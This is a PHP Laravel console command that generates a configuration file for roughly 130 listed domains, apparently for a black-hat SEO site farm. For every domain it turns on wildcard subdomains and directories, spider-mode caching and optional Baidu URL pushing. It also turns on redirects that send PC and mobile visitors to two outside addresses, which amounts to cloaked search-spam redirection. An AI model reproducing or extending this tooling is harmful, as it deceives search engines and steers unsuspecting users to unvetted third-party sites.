<?php

namespace App\Console\Commands;

use App\Models\IndexModel;
use Illuminate\Console\Command;
use Illuminate\Support\Facades\Storage;

class CreateWebCommand extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'command:create-web';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = '创建网站脚本';


    /**
     * Create a new command instance.
     *
     * @return void
     */
    public function __construct()
    {
        parent::__construct();
    }

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        $array = [
            "irmii.cn",
            "siaex.cn",
            "yrfon.cn",
            "maiyp.cn",
            "shenzhenzkhth.com",
            "wangjigrupo.com",
            "ncmtxww.cn",
            "lesij.com",
            "babysong.cn",
            "yuying2001.com",
            "xksbw.com.cn",
            "txoieaw.cn",
            "zlwzyvi.cn",
            "nkqkrad.cn",
            "gvwvobl.cn",
            "poczegr.cn",
            "mmclhjp.cn",
            "ttezclp.cn",
            "vdzjned.cn",
            "ewcahdi.cn",
            "ttqyanw.cn",
            "vfkaxpm.cn",
            "gckxlni.cn",
            "isvzhkq.cn",
            "hdhunle.cn",
            "pjbocwh.cn",
            "neiyjyo.cn",
            "vkeabgs.cn",
            "asvabcc.cn",
            "fpvtjqi.cn",
            "wrgfeed.cn",
            "btqttag.cn",
            "xjdtxzq.cn",
            "jhocfwd.cn",
            "kagvebg.cn",
            "serdkxh.cn",
            "sdwoexo.cn",
            "chilliprepper.com",
            "unifoto.cn",
            "eshiphr.com",
            "shjuhua.cn",
            "rwta.cn",
            "neteLe.cn",
            "ogvnw.com",
            "hengfa365.com",
            "hncjqt.com",
            "sxhyrm.cn",
            "yilechayin.cn",
            "iso9001rz.com.cn",
            "wxadbxg.cn",
            "mytournan.com",
            "86meili.com",
            "panel-ks.com",
            "wxfanucwx.cn",
            "rgmbya.cn",
            "aqcan.com",
            "amhuai.com",
            "aqkei.com",
            "cddfyl.com",
            "longkin.com.cn",
            "mjzuguf.cn",
            "yqwnsqa.cn",
            "rxwfqxz.cn",
            "rymcden.cn",
            "xvsaxkf.cn",
            "lfbfxee.cn",
            "dcvfozr.cn",
            "bypyrdg.cn",
            "nweoqdi.cn",
            "oegrkdq.cn",
            "xwLxu.com",
            "qycje.com",
            "hyidg.com",
            "pgrhz.com",
            "mvhme.com",
            "giunwe.cn",
            "gvbnza.cn",
            "jettqcq.cn",
            "pdsu.xyz",
            "heartmall.com.cn",
            "aiguipin.com",
            "visa-tour.cn",
            "changlinsw.com",
            "dishiguanjia.com",
            "xaxcgl.cn",
            "wzhbbp.com",
            "vlqhqyu.cn",
            "hvtfabu.cn",
            "ywwwzls.cn",
            "bjzrmhq.cn",
            "yuzqfii.cn",
            "ehxzvab.cn",
            "wxfqdvh.cn",
            "bntxpas.cn",
            "gjaorwa.cn",
            "ipyollp.cn",
            "neydzht.cn",
            "wzxybxg.cn",
            "zhaojt.top",
            "zhangyijing.top",
            "La-Laborantine.com",
            "iamjasongant.com",
            "lyyima.com",
            "nypos.com.cn",
            "aabadwwd.cn",
            "aabadbbd.cn",
            "bcsf100.com",
            "tjyqx.com",
            "llufsaz.cn",
            "fqddwon.cn",
            "dlriverside.com",
            "szhaili.com.cn",
            "phdcod.com",
            "jnlyxsc.cn",
            "cdxinghuo.com",
            "xaxdtbz.com",
            "nnfhbj.com",
            "pxlonking.cn",
            "zhanqunguanli.cn",
            "wnbpq.com",
            "wxqtgc.com",
            "sxsyx.org.cn",
            "yuhongtrip.cn",
        ];

        $a = '<?PHP
return [';
        for ($i = 0; $i < count($array); $i++) {
            $a .= "
            '$array[$i]'=>[
         // 网站相关
        'template' => 'wdj',//模板
        'prefix_status' => 1,//泛解析 1开,0关
        'prefix_path_status' => 1,//泛目录 1开,0关
        'cache_path' => 1, //缓存 1开,0关 // 蜘蛛模式才生效

        // 百度推送相关
        'baidu_status' => 0, //是否推送 1开,0关
        'baidu_number' => 0, //每日推送条数
        'baidu_token' => '', //推送 token
        'prefix_site_array' => [  // 泛前缀  泛前缀 -- 百度推送需要 默认www

        ],

        // 跳转相关
        'is_jump' => 1, // 1跳,0关
        'jump_hard_status' => 401, // 200, 403, 404
        'jump_url_pc' => 'https://agg.robinmalgoire.com', // pc 完整地址 http | https
        'jump_url_m' => 'https://hh.elmtreemarketing.com', // 手机 完整地址 http | https
        ],";
        }
            $a .= '
];
';

            Storage::disk('local')->put('file.php', "$a");


    }
}
